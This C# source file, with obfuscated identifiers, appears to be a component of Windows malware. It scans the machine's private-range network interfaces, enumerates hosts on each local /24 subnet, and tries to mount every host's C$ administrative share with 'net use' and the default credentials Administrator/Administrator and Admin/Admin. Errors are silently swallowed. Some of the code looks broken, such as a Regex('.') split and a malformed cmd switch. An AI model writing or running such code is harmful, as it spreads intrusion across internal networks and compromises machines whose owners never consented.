using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;

namespace YzTymtbtgFABHvJvj;

internal class jpDzBSUERTvlt
{
	public static void DwwtErszDrApwV()
	{
		List<CpsHVasgAe> list = CpsHVasgAe.cIWmfhpGhkv();
		foreach (CpsHVasgAe item in list)
		{
			try
			{
				if (item.FFxDkVWJYZOA.StartsWith("10.") || item.FFxDkVWJYZOA.StartsWith("172.") || item.FFxDkVWJYZOA.StartsWith("192.168."))
				{
					MdSuPZXxpOdiuN.pTOrrKUqMAsEjRV(item.EvwSDUcfodVXL, item.FFxDkVWJYZOA, "255.255.255.0");
				}
			}
			catch
			{
			}
			Thread.Sleep(eqCksjvMyn.UIEwMIIeUW);
		}
		foreach (CpsHVasgAe item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string kEwfGyOqbsFgEXm = regex.Split(item2.FFxDkVWJYZOA)[0] + "." + regex.Split(item2.FFxDkVWJYZOA)[1] + "." + regex.Split(item2.FFxDkVWJYZOA)[2];
				List<string> list2 = gzbBPwHrQLXYuelF.YpSqrhUhBTlMXIwF(kEwfGyOqbsFgEXm);
				foreach (string item3 in list2)
				{
					if (item2.FFxDkVWJYZOA.StartsWith("10.") || item2.FFxDkVWJYZOA.StartsWith("172.") || item2.FFxDkVWJYZOA.StartsWith("192.168."))
					{
						eqCksjvMyn.xQfMOPCvvVAqwp("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Administrator Administrator");
						eqCksjvMyn.xQfMOPCvvVAqwp("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
